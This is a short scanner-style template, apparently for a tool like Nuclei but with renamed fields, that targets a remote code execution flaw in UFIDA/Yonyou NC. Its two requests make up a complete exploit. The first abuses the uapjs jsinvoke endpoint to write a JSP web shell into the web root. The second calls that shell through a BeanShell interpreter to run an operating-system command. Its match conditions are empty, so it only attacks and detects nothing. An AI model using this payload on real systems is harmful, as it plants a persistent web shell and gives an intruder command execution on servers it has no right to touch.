id: CNVD-C-2023-76801
brief:
    title: UFIDA NC uapjs - Remote Code Execution
    by: SleepingBag945
    level: critical
    about: There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.
    label:
        - cnvd
        - cnvd2023
        - yonyou
        - rce
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/uapjs/jsinvoke/?action=invoke'
      head:
        Content-type: application/x-www-form-urlencoded
      body: '{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/{{filename}}.jsp"]}'
      signs: []
    - verb: POST
      to:
        - '{{BaseURL}}/{{filename}}.jsp?error=bsh.Interpreter'
      head:
        Content-type: application/x-www-form-urlencoded
      body: cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
      signs: []
